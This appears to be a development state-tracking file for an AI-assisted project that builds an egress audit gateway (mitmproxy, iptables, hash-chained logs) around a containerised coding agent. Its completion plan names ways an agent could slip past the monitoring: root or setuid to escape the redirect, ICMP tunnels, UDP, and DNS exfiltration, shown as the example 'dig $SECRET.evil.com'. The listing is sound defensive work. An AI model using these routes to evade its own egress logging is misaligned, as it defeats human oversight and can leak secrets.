# AI-DLC State Tracking

## Project Information
- **Project Type**: Brownfield
- **Feature**: M7 — `--audit` network audit log (+ G6 egress allow-list)
- **Start Date**: 2026-08-11T13:36:55Z
- **Last Updated**: 2026-10-05
- **Branch**: `feature/audit-inception`
- **Current Stage**: CONSTRUCTION — Code Generation + Build & Test **complete
  (host-verified)**; live-container verification parked (no Docker in dev)

## ▶ RESUME POINT (next session)
Requirements + Workflow Planning + Application Design **all approved**.
CONSTRUCTION is implemented and host-verified (bash -n, dry-run behavior, 26 unit
tests incl. PBT all green). **The `--audit` feature is code-complete.**

**Live-testing (2026-08-15, user has Docker) — 3 iterations:**
- **Fix #1 (image, exit 127):** stock `mitmproxy/mitmproxy` lacks `iptables`.
  Added `compose/audit/Dockerfile` (mitmproxy + iptables + procps),
  `./build.sh --audit-gateway` → `trigon-audit-gw:latest`, default
  `TRIGON_AUDIT_IMAGE` now that tag, launch-time fail-closed preflight.
- **Fix #2 (perms, exit 1):** `PermissionError` on `/audit-log/.mitmproxy/*`.
  `cap_drop: ALL` strips DAC_OVERRIDE, so uid-0 can't write the host-owned
  (uid-1000 `mktemp`) mount. Added `DAC_OVERRIDE` to the sidecar `cap_add`
  (now `[NET_ADMIN, DAC_OVERRIDE]`).
- **Now:** gateway reaches **Healthy**, agent runs, session completes, log +
  summary land in the project's `audit-log/`. **BUT two open issues (below).**

**✔ Issue 1 (empty log) — FIXED and live-verified 2026-09-30 (committed):**
- Root cause was the addon, not iptables: `ignore_connection=True` in
  `tls_clienthello` makes mitmproxy build `TCPLayer(ignore=True)`, which has no
  flow, so `tcp_end` never fired. The `nf_tables` REDIRECT worked all along
  (packet counters rose; agent shares the gateway netns as uid 1000).
- Fix (`compose/audit/audit_addon.py`): destination-only mode now sets
  `ignore_hosts=.*` + `show_ignored_hosts=true` (still no decryption, but tcp_*
  hooks fire); SNI is parsed from the plaintext ClientHello, bytes counted per
  direction without retaining payload. Failed/hanging connects are tracked via
  `server_connect*` hooks and logged with an `error` field (schema addition,
  `docs/audit-design.md` §5.1). `done()` flushes open connections + pending
  attempts.
- Fix (`trigon-up.sh` finalize): `compose rm --stop --force -v audit-gw` before
  copying the log, so the flush happens and the sidecar no longer outlives the
  session.
- Live result: real destinations with byte counts, `192.0.2.1` logged as
  `"unresolved at shutdown"`, no healthcheck noise, no leftover gateway.
- Caveats: records are written at connection close; plain-HTTP (:80) records
  carry a bare IP as `dst_host`; mitmproxy hot-reloads the addon if the file is
  edited mid-session (flushes + loses in-flight SNI).

**▶ COMPLETION PLAN (agreed 2026-10-05) — start here next session at Batch 1.**
Goal: make "ALL agent egress is logged or blocked" literally true, fix the log
location (issue 2) and support concurrent sessions. Batches in order:

**Batch 1 — one quick session, low risk (no Docker needed except a final smoke run):**
- **1a. `--audit` + `--root` guard (NEW HOLE, found 2026-10-05).** `entrypoint.sh`
  RETURNs uid 0 so mitmproxy's own upstream isn't looped back; with `--root` the
  agent *is* uid 0 (`LOCAL_UID=0`), so none of its egress is redirected/logged.
  Same if the host user is root (e.g. CI). Running mitmdump under a dedicated uid
  is not enough: `--root` grants `SETUID`, so the agent could switch to it. Fix:
  refuse `--audit` + `--root` (like `--playwright`), and refuse when `id -u` is 0.
  Add bats cases.
- **1b. Per-session compose project.** `trigon-up.sh` never passes `-p`, so every
  invocation (audit or not, incl. the litellm sidecar / air-gap net) shares the
  compose project "compose" → `compose-audit-gw-1` collides. Fix: per-invocation
  `-p trigon-${NAME}-<short random>` (lowercased/sanitized) on every compose call,
  plus `compose down` at exit so per-session networks don't accumulate. Finalize's
  `rm --stop audit-gw` then targets only this session's gateway.
- **1c. Issue 2 — log location + tamper evidence (decision D7, approved 2026-10-05).**
  - Destination: `${XDG_STATE_HOME:-$HOME/.local/state}/trigon/audit/<project-slug>/`,
    overridable via `TRIGON_AUDIT_DIR`. No longer written into `<project>/audit-log/`
    (update requirements wording, README, `--help`, `.gitignore` note, design §5).
  - Add that dir to `mount_denied_reason()` (G1 deny-list) so it can never be
    mounted into a container. Dir 0700, finished files chmod 0444.
  - Hash chain: each JSONL record carries `prev` = sha256 of the previous line
    (genesis = fixed value); schema bump to v2. `audit_summary.py` verifies the
    chain, records the head hash in the summary, and `trigon-up.sh` prints the
    head hash at session end. Result: the agent never reaches the log
    (tamper-proof from the agent), later edits by anyone are detectable.
  - Update `tests/test_audit_summary.py` (chain verify + PBT: any single-line
    edit/delete/reorder is detected) and `audit.bats`.

**Batch 2 — coverage (needs live checks on the user's Docker):**
- Redirect **all** agent TCP (not just 80/443) to mitmproxy; keep loopback and the
  gateway uid excluded. Destination-only mode passes everything through
  immediately (`ignore_hosts=.*`), so server-speaks-first protocols (SSH, SMTP,
  DBs) should work. Decrypt mode: limit interception to :80/:443 via an
  `ignore_hosts` regex on `host:port` — verify live.
- **Block everything else by default** (filter OUTPUT for the agent uid): allow lo,
  TCP (redirected), DNS (→ Batch 3); **REJECT** (not DROP, so clients fall back
  fast) all other UDP incl. QUIC, ICMP (Docker's default `ping_group_range` lets
  an unprivileged uid ping without NET_RAW → ICMP tunnels), everything else. At
  shutdown dump the REJECT counters into the log as a "blocked" record.
  UDP/QUIC blocking accepted 2026-10-05 (see rationale below).
- **IPv6 off:** compose `sysctls: net.ipv6.conf.all.disable_ipv6=1` + `ip6tables`
  default-deny as belt-and-braces.
- Move `route_localnet` to compose `sysctls:` — the entrypoint's `sysctl -w ... || true`
  likely fails silently (`/proc/sys` is read-only in an unprivileged container).
- Update `--help`/README "ALL egress" wording to the precise guarantee.

**Batch 3 — DNS logging (the hard one; biggest remaining hole):**
- The agent resolves via Docker's embedded resolver 127.0.0.11; Docker's own nat
  OUTPUT DNAT runs before our appended rules and dockerd does the upstream lookup,
  so DNS never touches mitmproxy → `dig $SECRET.evil.com` exfiltrates unlogged.
- Fix: second mitmproxy listener in DNS mode (mitmproxy 11 supports `dns` mode);
  `-I` (insert, ahead of Docker's rules) a redirect of the agent uid's udp+tcp :53
  to it; addon logs query names via `dns_request`. Expect a few live iterations.
- Also verify whether `--air-gap` leaks DNS the same way (embedded resolver
  forwarding on `internal: true` networks).

**Batch 4 — before merge:**
- Live gates: `--audit-decrypt` doesn't break Claude Code's provider calls (Node
  CA trust); `--air-gap --audit` zero-egress; `--playwright-headless` egress
  transits the gateway.
- Pin `MITMPROXY_BASE` by digest in `compose/audit/Dockerfile` (NFR-6).
- Run `tests/cli/audit.bats` under bats + shellcheck; open PR to `master`.

**Rationale — blocking UDP/QUIC (asked 2026-10-05):** Claude Code is Node.js;
Node's `https`/`fetch` (undici) speak HTTP/1.1 (+HTTP/2 over TCP), not HTTP/3, so
it never uses QUIC. OpenCode (Bun) likewise. npm/pip/apt/git/curl are TCP.
DNS is the only UDP an agent needs, and it is handled separately (Batch 3).
Chromium (`--playwright-headless`) does try QUIC, but falls back to TCP
automatically when UDP is refused (as on many corporate networks) — REJECT makes
the fallback instant. What does break, by design: UDP tools (VPNs/WireGuard, NTP
clients, mosh, `nmap -sU` in security mode). Note that in the security-mode docs.
Container clock comes from the host, so NTP is irrelevant.

**Files delivered:** `trigon-up.sh` (flags/guards/fragment/finalize/help),
`compose/audit/{entrypoint.sh,audit_addon.py}`, `lib/audit_summary.py`,
`tests/cli/audit.bats`, `tests/test_audit_summary.py`, README + `.gitignore`,
`docs/audit-design.md`.

**Locked design decisions (D1–D6):**
- D1 = **transparent gateway** (agent on internal net; mitmproxy sidecar
  dual-homed, NET_ADMIN scoped to sidecar, iptables REDIRECT). B (internal-net +
  proxy) documented as fallback. Completeness ⟂ decryption (A logs all
  destinations incl. hostile; decrypt reveals only honest CA-accepting flows).
- D2 = **pass-through-SNI** on decrypt refusal (default); `--audit-decrypt-fail-closed` strict.
- D3 = **sidecar-only bind mount** for `audit-log/` (tamper-resistant, NFR-4).
- D4 = **mitmproxy pinned-by-digest** for both paths.
- D5 = **allow** `--audit` + `--playwright-headless`; refuse `--audit` + `--playwright`.
- D6 = flags `--audit`, `--audit-decrypt`, `--audit-allow-degraded`, `--audit-decrypt-fail-closed`.

**Key Construction crux:** how to pin the agent's default route to `audit-gw` in
Compose *without* granting the agent NET_ADMIN (decides whether D1-B fallback is
needed) — see `docs/audit-design.md` §10.

**Locked decisions to carry forward** (see `requirements.md`):
- Enforced gateway (unbypassable, reuses `--air-gap` internal-net topology).
- Destination-only logging by default; `--audit-decrypt` opt-in for full detail.
- Completeness is a hard guarantee; decryption is cooperative/soft (NFR-10) — do
  not market `--audit-decrypt` as unbypassable.
- Refuse `--audit` + `--playwright`; JSONL + summary in `audit-log/`; opt-in
  (default off); allow-list enforcement (G6) is out of scope this cycle.
- **Ceremony**: Full (aidlc-state.md + audit.md logging + approval gates)
- **Artifacts Root**: `docs/audit/` (repo convention; not the default `aidlc-docs/`)

## Workspace State
- **Existing Code**: Yes
- **Programming Languages**: Bash (`trigon-up.sh`, `build.sh`, wrappers), Python 3 (`lib/*.py`)
- **Build System**: `build.sh` + Docker multi-stage; Docker Compose fragments
- **Project Structure**: Single-repo CLI harness (no services/APIs/data stores)
- **Reverse Engineering Needed**: Yes — scoped to the networking/egress subsystem
- **Workspace Root**: `/app`

## Code Location Rules
- **Application Code**: Workspace root (`trigon-up.sh`, `compose/`, `lib/`)
- **Documentation / AI-DLC artifacts**: `docs/audit/` only
- **Design doc deliverable**: `docs/audit-design.md` (Application Design stage)

## Stage Progress
- [x] Workspace Detection — 2026-08-11T13:36:55Z
- [x] Reverse Engineering (scoped) — approved 2026-08-11
- [x] Requirements Analysis — `requirements.md` written (rev: enforced gateway +
  destination-only default + NFR-10 + verified VibePod prior art), **approved 2026-08-13**
- [x] User Stories — **SKIPPED** (single operator/DPO persona)
- [x] Workflow Planning — `inception/plans/execution-plan.md` written, **approved 2026-08-13**
- [x] Application Design — `docs/audit-design.md` + `inception/plans/application-design-plan.md`
  (D1–D6 answered), **approved 2026-08-15**
- [x] Units Generation — **SKIPPED** (single component)
- [x] Construction — Code Generation + Build & Test **complete, host-verified**
  (live-container verification parked); Functional/NFR/Infra Design folded into
  Application Design

## Extension Configuration
| Extension | Enabled | Mode | Decided At |
|---|---|---|---|
| Security Baseline | Yes | Blocking (all rules) | Requirements Analysis |
| Resiliency Baseline | No | — | Requirements Analysis |
| Property-Based Testing | Yes | Partial (PBT-02/03/07/08/09 blocking; rest advisory) | Requirements Analysis |

## Scope Note
- Q7=B expanded this cycle from "design doc" to **full implementation** of
  `--audit` (Inception → Construction). Flagged for confirmation at the
  Requirements approval gate.
